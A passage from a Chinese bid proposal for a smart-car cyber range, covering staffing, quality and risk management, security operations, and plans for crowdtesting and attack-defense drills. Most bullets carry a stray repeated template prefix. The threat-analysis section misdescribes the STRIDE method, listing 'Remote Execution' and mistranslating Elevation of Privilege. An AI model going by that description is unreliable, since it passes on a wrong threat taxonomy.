培训师：</p><p>功能参数如下：职责：负责项目中的培训工作，包括培训需求分析、培训计划制定、培训材料开发和培训实施，以确保项目成果的顺利转化和用户的有效使用。</p><p>功能参数如下：配备情况：根据项目的培训需求，配置专门的培训师或由项目团队成员兼任培训角色。</p><p>4. 需求分析师：</p><p>功能参数如下：职责：负责收集、分析和管理项目需求，与利益相关者沟通，确保需求的准确性和一致性。</p><p>功能参数如下：配备情况：根据项目需求，配置需求分析师或由项目经理或技术人员兼任需求分析角色。</p><p>5. 测试专员：</p><p>功能参数如下：职责：负责项目的测试计划、测试用例设计、测试执行和缺陷管理，确保项目交付的质量和稳定性。</p><p>功能参数如下：配备情况：根据项目规模和复杂性，配置专门的测试人员或由技术人员兼任测试角色。</p><p>6. 项目管理员：</p><p>功能参数如下：职责：负责项目文档管理、会议组织、进度跟踪、沟通协调等项目管理支持工作，以提高项目执行效率和团队协作能力。</p><p>功能参数如下：配备情况：根据项目规模和需求，配置专门的项目管理员或由团队成员兼任项目管理支持角色。</p><p>以上角色的配备情况应根据项目的规模、复杂性和时间要求进行评估和调整，以确保项目团队具备所需的技能和资源，能够有效地完成项目目标。</p><p><strong>质量管理及文档管理方案：</strong></p><p>质量管理方案是确保项目交付成果符合预期质量标准的计划和方法。以下是质量管理方案的描述：</p><p>1. 质量目标和标准：</p><p>功能参数如下：确定项目的质量目标，例如产品的功能性、性能、可靠性、安全性等方面的要求。</p><p>功能参数如下：确定适用的质量标准，例如ISO 9001质量管理体系标准、行业标准或组织内部的质量标准。</p><p>2. 质量计划：</p><p>功能参数如下：制定质量管理计划，包括质量管理活动、质量控制和质量保证措施的安排。</p><p>功能参数如下：确定质量检查和测试的方法和频率，以及质量记录和报告的要求。</p><p>3. 质量控制：</p><p>功能参数如下：确定质量控制活动，包括产品检查、测试、验证和审查等，以确保产品符合质量标准。</p><p>功能参数如下：确定质量控制的责任和流程，例如制定检查清单、设立质量门禁点等。</p><p>4. 质量保证：</p><p>功能参数如下：设立质量保证措施，包括过程审查、质量审核和质量改进等，以确保项目过程符合质量要求。</p><p>功能参数如下：确定质量保证的责任和流程，例如制定过程审查计划、进行内部审核等。</p><p>5. 缺陷管理：</p><p>功能参数如下：建立缺陷管理机制，包括缺陷的识别、记录、分类、分析和解决等，以及缺陷的跟踪和闭环处理。</p><p>功能参数如下：确定缺陷管理的责任和流程，例如制定缺陷报告模板、设立缺陷管理工具等。</p><p>6. 持续改进：</p><p>功能参数如下：实施持续改进措施，包括收集质量数据和反馈、进行质量分析和评估，并制定改进计划和行动。</p><p>功能参数如下：确定持续改进的责任和流程，例如制定质量数据收集和分析方法、开展质量改进项目等。</p><p>文档管理方案是管理项目文档的计划和方法，以确保项目文档的有效管理和使用。以下是一个常见的文档管理方案的描述：</p><p>1. 文档分类和标识：</p><p>功能参数如下：根据文档的类型和用途，制定文档分类和标识方案，例如根据功能、阶段或文件类型进行分类，并为每个文档指定唯一标识符。</p><p>2. 文档版本控制：</p><p>功能参数如下：建立文档版本控制机制，确保文档的版本管理和变更控制，包括版本编号、变更记录和文档库的维护。</p><p>3. 文档访问和权限：</p><p>功能参数如下：确定文档的访问权限和控制策略，包括谁可以访问、修改和批准文档，并采取适当的安全措施，保护文档的机密性和完整性。</p><p>4. 文档存储和备份：</p><p>功能参数如下：确定文档的存储位置和方式，例如电子文档管理系统、共享文件夹或云存储，并制定定期备份和恢复计划。</p><p>5. 文档审查和批准：</p><p>功能参数如下：设立文档审查和批准流程，确保文档的准确性和一致性，包括审查人员的指定、审查记录的保存和批准的流程控制。</p><p>6. 文档变更管理：</p><p>功能参数如下：建立文档变更管理机制，包括变更请求的识别、评估和控制，以及变更的记录和通知。</p><p>7. 文档存档和销毁：</p><p>功能参数如下：确定文档的存档要求和周期，制定文档存档和销毁的规定，以及合规性和法律要求的遵守。</p><p>这些质量管理和文档管理方案的具体内容和实施方法应根据项目的需求和组织的要求进行定制和调整，以确保项目交付的质量和文档管理的有效性。</p><h6 id="风险预估和控制方法论："><a href="#风险预估和控制方法论：" class="headerlink" title="风险预估和控制方法论："></a>风险预估和控制方法论：</h6><p>我方将详细陈述对项目实施过程中不同阶段的风险预估和控制方法论，包括以下方面：</p><p>在项目实施过程中，对不同阶段的风险进行预估、识别、评估和控制是关键的风险管理活动。以下是对项目实施过程中不同阶段的风险预估和相关方法论的详细陈述：</p><p>1. 项目启动阶段：</p><p>功能参数如下：风险预估：在项目启动阶段，通过对项目目标、范围和约束条件的分析，预估可能出现的风险和挑战。</p><p>功能参数如下：风险识别方法：可以使用头脑风暴、SWOT分析、专家访谈等方法，收集团队成员和利益相关者的意见和建议，识别潜在的风险。</p><p>功能参数如下：风险评估方法：可以使用定性风险评估方法，对识别的风险进行概率和影响的评估，确定其优先级和紧急程度。</p><p>功能参数如下：风险控制策略：制定初步的风险应对策略，包括风险规避、风险转移、风险减轻和风险接受等策略。</p><p>2. 需求定义阶段：</p><p>功能参数如下：风险预估：在需求定义阶段，预估需求变更、需求不完整或不准确等可能导致的风险。</p><p>功能参数如下：风险识别方法：通过需求讨论、用户故事分析、原型验证等方法，识别需求相关的风险，例如需求理解不一致、需求冲突等。</p><p>功能参数如下：风险评估方法：可以使用定性和定量的风险评估方法，评估需求风险的概率、影响和优先级，确定需求管理的重点。</p><p>功能参数如下：风险控制策略：制定需求管理计划，包括需求变更控制、需求验证和确认、需求跟踪等策略，确保需求的准确性和一致性。</p><p>3. 设计和开发阶段：</p><p>功能参数如下：风险预估：在设计和开发阶段，预估技术复杂性、资源限制、沟通问题等可能导致的风险。</p><p>功能参数如下：风险识别方法：通过技术评审、原型测试、系统建模等方法，识别设计和开发过程中的风险，例如技术难题、资源不足等。</p><p>功能参数如下：风险评估方法：可以使用定性和定量的风险评估方法，评估设计和开发风险的概率、影响和优先级，确定风险应对的重点。</p><p>功能参数如下：风险控制策略：制定技术验证计划、质量控制措施、进度管理等策略，确保设计和开发过程的顺利进行和风险的控制。</p><p>4. 测试和验收阶段：</p><p>功能参数如下：风险预估：在测试和验收阶段，预估测试覆盖不足、缺陷修复延迟、验收标准不明确等可能导致的风险。</p><p>功能参数如下：风险识别方法：通过测试计划、测试用例设计、验收标准确认等方法，识别测试和验收过程中的风险，例如测试资源不足、验收标准变更等。</p><p>功能参数如下：风险评估方法：可以使用定性和定量的风险评估方法，评估测试和验收风险的概率、影响和优先级，确定风险管理的重点。</p><p>功能参数如下：风险控制策略：制定测试执行和缺陷管理计划、验收准则和验收测试策略，确保产品质量和验收标准的达成。</p><p>5. 实施和交付阶段：</p><p>功能参数如下：风险预估：在实施和交付阶段，预估部署问题、用户培训困难、运维支持不足等可能导致的风险。</p><p>功能参数如下：风险识别方法：通过实施计划、用户培训、运维手册等方法，识别实施和交付过程中的风险，例如部署故障、用户接受度低等。</p><p>功能参数如下：风险评估方法：可以使用定性和定量的风险评估方法，评估实施和交付风险的概率、影响和优先级，确定风险应对的重点。</p><p>功能参数如下：风险控制策略：制定实施计划和交付策略，包括部署计划、用户培训、运维支持等，确保项目的成功实施和交付。</p><p>在风险管理过程中，还可以使用一些常见的方法论和策略：</p><p>- 风险概率和影响矩阵：根据风险事件的概率和影响程度，绘制风险矩阵，确定风险的优先级和重要性。</p><p>- 风险转移和分担：通过合同约定、保险购买等方式，将一部分风险转移给我司或其他利益相关者。</p><p>- 风险应急计划：制定应急预案，包括灾难恢复计划、业务连续性计划等，以应对突发风险事件。</p><p>- 风险监控和沟通：建立风险监控机制，及时跟踪风险状态，定期报告风险情况，并与利益相关者进行有效的沟通和协调。</p><p>以上方法论和策略的选择和应用应根据项目的特点、风险的性质和项目团队的经验来确定，以确保项目风险的有效管理和控制。</p><h6 id="质量保证方案"><a href="#质量保证方案" class="headerlink" title="质量保证方案"></a>质量保证方案</h6><p>为保证系统实施质量，需要制定一个全面的质量保证方案，该方案应包括对项目相关应用系统在功能和性能方面的预估和承诺技术方案，以及项目实施和上线中所需的支撑和运维工作。下面是一个详细描述的质量保证方案：</p><p>1. 功能预估和承诺技术方案：</p><p>功能参数如下：需求分析和规格定义：通过与利益相关者的沟通和需求分析，明确系统的功能需求，并将其转化为详细的规格定义。</p><p>功能参数如下：原型设计和评审：基于规格定义，进行原型设计和评审，确保系统的功能设计符合需求，并获得相关利益相关者的确认。</p><p>功能参数如下：开发和编码：根据规格定义和原型设计，进行系统的开发和编码工作，确保功能的正确实现和代码的质量。</p><p>功能参数如下：单元测试和集成测试：对开发完成的功能模块进行单元测试和集成测试，验证其功能的正确性和稳定性。</p><p>功能参数如下：系统测试和验收测试：对整个系统进行系统测试和验收测试，确保系统在功能方面符合规格定义和用户需求。</p><p>2. 性能预估和承诺技术方案：</p><p>功能参数如下：性能需求分析和定义：与利益相关者合作，明确系统的性能需求，例如响应时间、吞吐量等，并将其转化为详细的性能规格定义。</p><p>功能参数如下：性能测试计划和设计：制定性能测试计划，包括测试场景、负载模型和测试工具的选择，并设计性能测试用例。</p><p>功能参数如下：性能测试执行和分析：执行性能测试，收集性能数据，并进行性能分析和评估，确保系统在负载条件下的性能满足规格定义。</p><p>功能参数如下：性能优化和调优：根据性能测试结果，进行系统的性能优化和调优，提高系统的响应时间和吞吐量。</p><p>3. 项目实施和上线支撑：</p><p>功能参数如下：部署计划和方案：制定详细的部署计划和方案，包括硬件和软件环境的准备、系统配置和安装、数据迁移等。</p><p>功能参数如下：用户培训和支持：提供用户培训计划和材料，培训用户使用系统，并提供及时的用户支持和帮助。</p><p>功能参数如下：运维手册和文档：编写系统的运维手册和文档，包括系统配置、维护和故障处理等，以支持系统的正常运行和维护。</p><p>功能参数如下：运维团队和服务级别协议：组建专业的运维团队，确保系统的持续运行和故障排除，并与利益相关者达成服务级别协议。</p><h2 id="能力交付管理"><a href="#能力交付管理" class="headerlink" title="能力交付管理"></a>能力交付管理</h2><p>我们在交付能力管理方面致力于支撑项目的顺利落地，确保项目按时、高质量地交付。为此，我们向甲方提供以下承诺：</p><p>1. 项目规划与协调：我们将与甲方密切合作，进行项目规划和协调工作。我们将全面了解项目需求和目标，并制定详细的项目计划和时间表。我们将与甲方保持密切沟通，确保项目进展顺利，并及时调整计划以应对任何变化或挑战。</p><p>2. 人员资源配备：我们将为项目配备经验丰富、技术娴熟的团队成员。我们的团队将具备相关领域的专业知识和技能，以确保项目的成功交付。我们将根据项目需求，合理分配资源，并提供必要的培训和支持，以确保团队的高效协作和卓越绩效。</p><p>3. 交付质量保证：我们将严格遵循项目管理和质量管理的最佳实践。我们将制定详细的交付标准和质量控制计划，确保项目交付的质量和准确性。我们将进行严格的测试和验证，以确保交付的解决方案符合甲方的需求和期望。</p><p>4. 风险管理：我们将积极进行风险管理，识别和评估项目中的潜在风险，并制定相应的应对策略和计划。我们将与甲方紧密合作，共同解决和应对风险，以确保项目的顺利进行和交付。</p><p>5. 沟通与协调：我们将建立有效的沟通渠道，并定期与甲方进行项目进展报告和沟通。我们将及时回应甲方的需求和反馈，并积极协调各方利益相关者的合作。我们将确保甲方对项目的进展和交付情况有清晰的了解，并及时解决任何可能的问题或疑虑。</p><p>具体工作如下：</p><ul><li>提供平台演示DEMO可用作演示参观使用，内容包含上述方案提到的态势内容、车辆资产信息、威胁分析报表的情况展示，演示DEMO支持实时时间信息和车型数量信息, DEMO大屏支持高清（2K以上）展示，界面简洁大方，能够直观看到风险信息</li><li>我方会结合汽车安全运营中心提供详尽的安全运营体系方案，有效提升XXXX资产管理效率、漏洞处置及事件处置效率。</li><li>我方会帮助甲方构建安全运维的能力：能使人员独立熟练对上报的威胁告警事件进行分析、评估及应急响应的能力；</li><li>我方会帮助甲方人员熟悉对平台规则在线配置的能力：能使安全运维人员独立熟练进行在线配置，具备保证业务正常运行的能力。</li></ul><p>综上所述，我们将以专业、高效和负责任的态度，全力支撑项目的顺利落地和成功交付。我们将与甲方紧密合作，共同努力，确保项目的成功，并为甲方提供卓越的交付能力管理服务。</p><h3 id="安全运营体系方案"><a href="#安全运营体系方案" class="headerlink" title="安全运营体系方案"></a>安全运营体系方案</h3><p>为XXXX提供详尽的安全运营体系方案，以有效提升资产管理效率、漏洞处置和事件处置效率，可以采取以下措施：</p><p>1. 安全策略和政策：</p><p>功能参数如下：制定全面的安全策略和政策，明确安全目标、原则和责任，确保安全意识贯穿于整个组织。</p><p>功能参数如下：定期审查和更新安全策略和政策，以适应不断变化的威胁和风险环境。</p><p>2. 资产管理：</p><p>功能参数如下：建立资产清单和分类，明确对关键资产的重要性和敏感性，制定相应的保护措施。</p><p>功能参数如下：实施资产追踪和监控机制，确保资产的及时发现、识别和管理。</p><p>3. 漏洞管理：</p><p>功能参数如下：建立漏洞管理流程，包括漏洞扫描、漏洞评估和漏洞修复等环节，确保对系统和应用程序的漏洞进行及时发现和修复。</p><p>功能参数如下：实施漏洞管理工具和系统，自动化漏洞扫描和跟踪，提高漏洞处置效率。</p><p>4. 事件管理：</p><p>功能参数如下：建立事件管理流程，包括事件检测、响应、调查和恢复等环节，确保对安全事件的及时处置和恢复。</p><p>功能参数如下：实施安全信息和事件管理系统，集中管理和分析安全事件日志，提高对安全事件的监控和响应能力。</p><p>5. 安全培训和意识：</p><p>功能参数如下：组织安全培训和意识活动，提高员工对安全风险和威胁的认识，增强安全意识和行为。</p><p>功能参数如下：定期进行模拟演练和应急演练，提高员工对安全事件的应对能力和处置效率。</p><p>6. 第三方管理：</p><p>功能参数如下：对供应商和合作伙伴进行安全评估和监控，确保其符合XXXX的安全要求。</p><p>功能参数如下：签订合适的合同和协议，明确安全责任和义务，确保合作伙伴的安全配合和合规性。</p><p>7. 安全审计和改进：</p><p>功能参数如下：定期进行安全审计和评估，发现安全风险和问题，并制定改进计划和措施。</p><p>功能参数如下：建立持续改进机制，跟踪和监控安全运营体系的有效性和成效，不断提升安全管理水平。</p><p>该安全运营体系方案旨在提升XXXX的资产管理效率、漏洞处置和事件处置效率，并确保组织的信息资产和业务活动的安全。具体的实施细节和措施应根据XXXX的实际情况和需求进行定制。</p><h1 id="智能汽车网络靶场众测活动模块"><a href="#智能汽车网络靶场众测活动模块" class="headerlink" title="智能汽车网络靶场众测活动模块"></a>智能汽车网络靶场众测活动模块</h1><h2 id="总体概述-4"><a href="#总体概述-4" class="headerlink" title="总体概述"></a>总体概述</h2><p>测试活动是靶场测试重要的组成部分，在测试活动开始前，需要指定对应的测试活动方案，以应对不同测试活动的需求，测试活动主要分为众测、攻防演练、测试分析。众测活动用于发布针对固定产品在固定时间内，进行测评与漏洞提交的模式。攻防演练活动模拟实际针对车辆或相关系统的网络攻击和防御活动的练习，目的是提高车辆及车联网系统网络安全防护的能力和应对突发事件的能力。测试分析活动可确定车联网系统可能面临的安全威胁和风险，协助制定测试计划与测试重点。活动支持活动创建、管理、发布。至少包括活动的名称、时间、类型、测试范围、奖励机制等。活动模块支持公网域名发布，也支持通过openVPN方式接入访问，保证活动的隐私与安全性。</p><h2 id="测试活动方案"><a href="#测试活动方案" class="headerlink" title="测试活动方案"></a>测试活动方案</h2><p>本活动方案包含活动简介、历届活动、组织架构、日程安排、奖项设置、比赛项目、比赛规则、选手须知、裁判规则、禁止条例形成的活动企划书。</p><h2 id="众测活动规划方案响应"><a href="#众测活动规划方案响应" class="headerlink" title="众测活动规划方案响应"></a>众测活动规划方案响应</h2><p>功能参数满足如下要求：</p><ol><li>包含活动简介、历届活动、组织架构、日程安排、奖项设置、比赛项目、比赛规则、选手须知、裁判规则、禁止条例等，并提供活动企划书；</li><li>活动简介包含背景介绍、内容介绍、活动形式；</li><li>组织架构包含主办单位、组委会、专家组、裁判组；</li><li>日程安排包含活动事项、时间、地点；</li><li>奖项设置包含奖项名称、名额、奖励及证书；</li><li>比赛项目包含比赛规模介绍、比赛内容介绍、比赛时长介绍、比赛环境介绍；</li><li>比赛规则包含报名规则、积分与晋级规则、赛题评分规则、漏洞评分规则；</li><li>裁判规则包含裁判分工与职责；</li><li>提供活动所需的靶场演练方案，包含赛提大纲、靶场拓扑规划；</li><li>提供活动所需的网络、电力规划方案；</li><li>提供活动所需的零部件、台架、车辆接入方案，包含接口类型、数量；</li><li>提供与智能汽车网络靶场动态测试接入网关的集成方案；</li><li>提供禁止条例包含保密、攻击方式限制；</li><li>提供选手申诉方案及申诉表模板；</li><li>提供活动方案所需的物料清单；</li><li>费用预算包含费用构成、价格、数量；</li><li>根据方案在靶场中创建众测场景模板工程；</li><li>3年内提供3场众测活动支持，支持内容包含方案筹划，现场准备，技术支持，执裁等。</li></ol><h2 id="众测活动招标响应方案"><a href="#众测活动招标响应方案" class="headerlink" title="众测活动招标响应方案"></a>众测活动招标响应方案</h2><h3 id="众测活动规划方案"><a href="#众测活动规划方案" class="headerlink" title="众测活动规划方案"></a>众测活动规划方案</h3><p>汽车安全众测活动组织旨在通过广泛参与，评估车辆系统的安全性。通过众测，发现并修复潜在漏洞，保护车辆和乘客免受攻击。活动包括漏洞扫描、渗透测试和代码审查等多种方法，覆盖车辆内部系统、通信接口和软件应用。测试结果将分析和评估，提供改进建议和风险管理措施。通过众测活动，促进汽车信息安全的提升，确保车辆的可靠性和乘客的安全。</p><p>活动组织方式及内容符合要求，以下为活动企划书：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a747a8a9595e089ef73f67b7288af228.png"></p><p>我方响应3年内提供3场众测活动支持，支持内容包含方案筹划，现场准备，技术支持，执裁等。</p><h3 id="攻防演练活动规划方案"><a href="#攻防演练活动规划方案" class="headerlink" title="攻防演练活动规划方案"></a>攻防演练活动规划方案</h3><p>攻防对抗比赛活动组织旨在模拟真实网络环境下的攻击和防御情景，促进网络安全技能的提升。参与者分为攻击方和防御方，通过攻击和防御操作竞争得分。比赛包括网络漏洞扫描、渗透测试、恶意代码分析等挑战，涵盖系统、应用和网络层面。比赛结果根据得分和时间评判，最终颁发奖项。活动组织需制定比赛规则、提供测试环境和工具，确保公平公正。攻防对抗比赛活动激发参与者的技术竞争力，推动网络安全技术的发展。活动方案包含：</p><p><strong>组织要素</strong></p><p>包含组织单位、技术支撑单位、攻击队伍、防守队伍，清晰定义各组织要素的职能、角色和任务目标。</p><p><strong>组织形式</strong></p><p>说明不同组织形式下的组织关键内容，包括演习范围、周期、场地、设备、攻防队伍组建、规则制定、视频录制等多方面；</p><p>定义阶段</p><p>包含演习阶段、策划阶段、前期准备阶段、实战演练阶段、演练总结阶段；</p><p><strong>阶段工作内容定义</strong></p><p>包含内容策划，支持基于不同的演训类型进行内容策划，包括竞赛夺旗演练、红蓝对抗演练、综合演练，组织内容，清晰定义演练组织、演练目标、演练规则、演练流程；</p><p><strong>演练平台搭建</strong></p><p>包含攻击场地、防守场地、攻击目标、攻击分析中心、指挥大厅；</p><p><strong>演练配置</strong></p><p>包含演练活动管理，场景定义、任务定义、任务顺序定义、队伍配置、自动环境分配、靶标分配、靶标检测工具支撑、演练成果实时查看、成果提交、统计排名、演练停止与恢复、演练报告与归档；</p><p><strong>应急保障措施</strong></p><p>包含准备内容，至少清晰定义演练准备的资源准备、人员准备；清晰定义演练过程的，定义如何依据演习策划内容，协调攻击方和防守方，并在过程中展开监控、研判、应急处置等工作；定义演习保障的核心工作内容，包含人员安全保障、攻击过程监控、专家研判、攻击过程回溯、信息通告、人员保障、资源保障、后勤保障、应急处置；</p><p><strong>演习总结</strong></p><p>清晰定义演习总结阶段工作内容，包含演练恢复、演练总结、评估建议；清晰定义实战攻防演练的风险规避措施。</p><p><strong>其他</strong></p><p>根据方案在靶场中创建攻防演练场景模板工程；</p><p>3年内提供3场攻防演练支持，支持内容包含方案筹划，现场准备，技术支持，执裁等；</p><h3 id="测试分析活动规划方案"><a href="#测试分析活动规划方案" class="headerlink" title="测试分析活动规划方案"></a>测试分析活动规划方案</h3><p>测试分析活动为了评估和分析车载相关系统、应用程序或零部件安全风险的行为，该活动主要通过信息调研、功能定义、资产识别、威胁场景识别、攻击路劲分析、风险评估等方式来定义汽车的网络安全等级级风险点。</p><p>本方案组织的针对整车信息安全的测试分析活动内容主要包含：</p><p><strong>信息调研：</strong></p><p>通过问卷调查或现场访谈，收集整车架构、关键功能特性和访问点等信息，以了解车辆的技术构成、主要功能和用户接口，为进一步研究和改进提供基础数据。</p><p><strong>功能定义：</strong></p><p>通过对调研收集的信息，采用数据流图的方法对评估对象进行描述。评估对象的范围被确定，功能单元、数据流、数据存储以及物理和逻辑边界被识别。数据流图展示了评估对象内部的信息流动和处理过程，帮助理解系统的组成部分、数据传递路径和与外部系统的交互。通过这种方式，可以更好地分析和评估评估对象的功能和性能。</p><p><strong>资产识别：</strong></p><p>在功能定义阶段，通过输出的数据流图识别安全资产。这包括功能单元、数据流、数据存储和外部实体等内容。然后，识别安全资产的网络安全属性，并分析资产可能面临的危害场景。通过这个过程，可以确定系统中的关键资产、其在系统中的位置和流动路径，并评估潜在的安全威胁和攻击场景，以便制定相应的安全保护措施和风险应对策略。</p><p>威<strong>胁场景识别：</strong></p><p>采用STRIDE2方法，结合资产、网络安全属性和危害场景，进行资产实体的威胁场景识别。STRIDE2方法考虑以下威胁类型：拒绝服务（Denial of Service）、信息泄露（Information Disclosure）、篡改（Tampering）、冒充（Spoofing）、远程执行（Remote Execution）和拒绝访问（Elevation of Privilege）。通过分析每个资产实体的网络安全属性，如身份验证、访问控制和数据加密，识别潜在的威胁场景。这样可以帮助系统设计人员更好地了解资产的安全风险，并采取相应的防护措施来减轻或消除这些威胁。</p><p><strong>攻击路径分析：</strong></p><p>采用攻击树的方法，并参考现阶段国内外汽车信息安全事件，分析攻击路径。攻击树是一种图形化的工具，用于描述攻击者实现目标所需的步骤和条件。通过分析已发生的汽车信息安全事件，可以识别出潜在的攻击路径。这些攻击路径可能涉及车载系统的漏洞利用、远程攻击、物理接口攻击等。通过绘制攻击树，可以清晰地展示攻击者的思维过程和攻击路径，帮助系统设计人员识别并强化系统的安全防护措施，以保护汽车信息系统免受潜在的攻击威胁。</p><p><strong>风险评估：</strong></p><p>基于安全资产的危害场景及其面临的潜在威胁，结合具体业务功能和应用场景，进行风险分析和评估。首先，根据危害的严重程度和攻击成功的可能性两个方面，对潜在威胁进行评估。严重程度包括信息泄露、系统瘫痪、用户安全受损等，攻击成功的可能性则考虑攻击者的技术能力、资源和动机等因素。然后，根据评估结果，确定被评估资产对象的网络安全风险等级，如高、中、低风险等级。这样可以帮助决策者了解资产的风险状况，优先采取相应的安全措施来降低潜在威胁的风险影响。</p><p><strong>其他内容</strong></p><p>3年内提供不少于2个车型的零部件及整车测试分析培训，培训内容包含但不限于资产识别、业务流分析、威胁分析与风险评估、测试点评估等</p><h3 id="联邦互联活动规划方案"><a href="#联邦互联活动规划方案" class="headerlink" title="联邦互联活动规划方案"></a>联邦互联活动规划方案</h3><p>联邦互联靶场是一个模拟真实网络环境的虚拟训练平台，用于进行网络安全攻防演练和技术培训。它是一个由多个独立网络组成的联邦网络，每个网络都代表一个特定的组织或系统。联邦互联靶场的目标是提供一个安全、可控的环境，供安全专业人员和团队进行实际的攻击和防御操作。在联邦互联靶场中，参与者可以扮演攻击者或防御者的角色，通过模拟真实的攻击场景和漏洞利用技术，进行攻击和防御的对抗。参与者可以利用各种工具和技术，测试和评估自己的安全能力，并学习如何应对不同类型的攻击。联邦互联靶场的优势在于提供了一个安全的环境，参与者可以在其中进行实战演练，掌握实际的攻击和防御技术。它还可以模拟复杂的网络架构和环境，帮助参与者了解实际网络中的安全挑战，并提供实时的反馈和评估。通过联邦互联靶场的使用，安全专业人员和团队可以不断提升自己的技能和经验，发现和修复潜在的安全漏洞，提高网络的安全性。此外，联邦互联靶场还可以用于安全培训和认证考试，帮助人们获取和证明自己的安全专业能力。总之，联邦互联靶场是一个重要的网络安全训练和实践平台，对于提升网络安全能力和应对实际威胁具有重要意义。</p><p>联邦互联活动主要包含以下内容：</p><p><strong>联邦互联场景内容策划：</strong></p><p>联邦互联场景内容策划包括选择参与的场景，场景之间的对接和场景访问顺序。首先，根据训练目标和需求，选择适当的场景，如网络渗透、恶意软件分析、应急响应等。然后，确定场景之间的对接方式，可以是线性的，即一个场景完成后进入下一个场景；也可以是非线性的，允许参与者根据自己的选择和进展决定访问顺序。最后，提供参与者访问场景的指南，包括场景的名称、描述、访问方法和前置条件等，确保参与者按照既定顺序进行训练，并获得所需的技能和知识。这样的策划能够提供一个有组织、连贯且有针对性的联邦互联训练体验。</p><p><strong>联邦互联场景组织：</strong></p><p>联邦互联场景组织是为了实现有效的协作和交互，确保联邦互联活动的顺利进行。首先，明确互联活动的组织结构，包括参与的组织或团队，各自的角色和责任。其次，制定明确的目标和规则，确保参与者了解他们的任务和期望。流程方面，需要定义清晰的活动流程，包括场景选择、访问顺序、时间安排和交流方式等。此外，还需要建立有效的沟通和协作机制，以便参与者能够共享信息、协调行动并解决问题。通过明确的组织、目标和流程，可以确保联邦互联活动的有序进行，达到预期的训练效果。</p><p><strong>支撑搭建平台：</strong></p><p>搭建联邦互联靶场平台涉及攻击场地、防守场地、攻击目标、攻击分析中心和指挥大厅等要素。攻击场地是模拟真实网络环境的区域，包含易受攻击的系统和网络设备。防守场地是用于部署防御措施的区域，包括防火墙、入侵检测系统等。攻击目标是模拟真实系统的脆弱点，供攻击者攻击。攻击分析中心是用于收集、分析和评估攻击数据的中心，提供攻击情报和漏洞分析。指挥大厅是指挥和控制整个联邦互联活动的中心，负责协调攻击和防守的行动，收集和共享情报，指导参与者的训练。这样的联邦互联靶场平台能够提供一个实验环境，让参与者在模拟的攻防对抗中提升技能和加强安全意识。</p><p><strong>互联活动管理支撑：</strong></p><p>互联活动管理支撑包括场景定义、任务定义、任务顺序定义、队伍配置、自动环境分配、靶标分配、靶标检测工具支撑、互联活动成果实时查看、成果提交、统计排名、互联活动停止与恢复、互联活动报告与归档等方面。场景定义确定互联活动的环境和条件，任务定义明确参与者的具体任务，任务顺序定义规定任务的执行顺序。队伍配置确定参与者的组队情况，自动环境分配确保每个队伍获得适当的互联环境。靶标分配将攻击目标分配给相应的队伍，靶标检测工具支撑提供对攻击目标的检测和评估。互联活动成果实时查看使参与者能够实时查看自己和其他队伍的成果，成果提交用于提交参与者的攻击或防守成果。统计排名用于对参与者的表现进行排名和评比。互联活动停止与恢复管理活动的开始和结束，互联活动报告与归档记录互联活动的过程和结果，供后续分析和总结。这些管理支撑措施能够确保互联活动的顺利进行和有效管理。</p><p><strong>互联活动内容准备：</strong></p><p>活动内容准备包括互联活动准备的资源和人员的清晰定义。资源方面，需要准备网络设备、服务器、操作系统、应用程序等技术设施，以搭建互联活动所需的环境。此外，还需要准备模拟攻击和防御的工具、靶标系统、安全监控和分析工具等。人员方面，需要确定负责搭建和维护互联活动环境的技术人员，包括网络工程师、系统管理员和安全专家等。同时，还需要指定活动的组织者和协调者，负责活动的策划、安排和执行。他们应具备丰富的安全知识和组织能力，能够协调各方资源，确保互联活动的顺利进行。准备充分的资源和合适的人员能够为互联活动提供必要的支持和保障，确保活动的顺利进行和取得预期效果。</p><p><strong>活动策划定义：</strong></p><p>活动策划定义是指清晰定义互联活动的过程，并指导如何根据策划内容协调各个场景方，并在过程中展开监控、研判和应急处置等工作。策划内容应包括活动的目标、范围、时间安排、参与者角色和责任等方面的明确定义。在活动过程中，策划内容将指导场景方的准备工作、攻防对抗的执行和演练、成果的收集和分析等环节。同时，策划还要明确监控活动的方法和指标，以及研判攻击行为和风险的能力，以便在发现异常情况时能够及时做出应急处置。通过清晰的策划定义，可以确保互联活动的有序进行，并能够及时应对和解决可能出现的问题和风险，提高活动的效果和安全性。</p><p><strong>活动保障定义：</strong></p><p>活动保障定义包括清晰定义互联活动保障的核心工作内容，其中包括但不限于以下方面：人员安全保障，确保参与活动的人员的安全和隐私；攻击过程监控，对活动中的攻击过程进行实时监控和记录；专家研判，由专业人员对攻击行为和风险进行分析和评估；攻击过程回溯，对攻击过程进行溯源和重现，以便进行深入分析和调查；信息通告，及时向相关方通报活动的进展和结果；人员保障，提供必要的培训和支持，确保参与人员的能力和安全；资源保障，确保活动所需的技术和物资资源的供应和维护；后勤保障，提供必要的后勤支持，包括场地、设备等；应急处置，对发生的紧急情况进行及时响应和处理。通过清晰定义的活动保障，可以确保互联活动的安全性、顺利性和有效性。</p><p><strong>互联活动总结：</strong></p><p>活动总结阶段是对互联活动进行回顾和总结的阶段，其工作内容包括但不限于以下方面：互联活动回溯，对整个活动过程进行回顾和梳理，包括活动的准备、执行和结果等方面的回顾；演练总结，对演练过程进行评估和总结，包括演练的目标、设计、执行和效果等方面的总结；评估建议，根据活动的经验和教训，提出改进和优化的建议，以提升互联活动的质量和效果。通过清晰定义的活动总结，可以对互联活动进行全面的评估和反思，发现问题和不足之处，并提出具体的改进措施和建议，以便在下一次活动中能够更加顺利和有效地进行。总结阶段的工作对于活动的持续改进和提升具有重要的指导意义。</p><p><strong>风险规避措施：</strong></p><p>风险规避措施是为了降低互联活动中可能出现的安全风险和问题而采取的预防措施。以下是一些常见的互联活动风险规避措施：</p><p>安全策略和政策：制定明确的安全策略和政策，包括访问控制、身份认证、数据保护等方面的规定，确保互联活动的安全性。</p><p>强化网络安全措施：采取适当的网络安全措施，如防火墙、入侵检测系统、安全补丁管理等，保护互联活动中的网络系统和数据安全。</p><p>加密通信和数据：对互联活动中的通信和数据进行加密，确保数据在传输和存储过程中的机密性和完整性。</p><p>定期演练和测试：定期进行演练和测试，包括模拟攻击、红队/蓝队演练等，以发现潜在的安全漏洞，并及时采取措施加以修复。</p><p>供应链安全管理：加强对供应链环节的安全管理，包括对供应商的评估和监控，确保供应链中的组件和服务的安全性。</p><p><strong>联邦靶标构想：</strong></p><p>联邦靶标构想是一个包含以下要素的设想：</p><p>1. 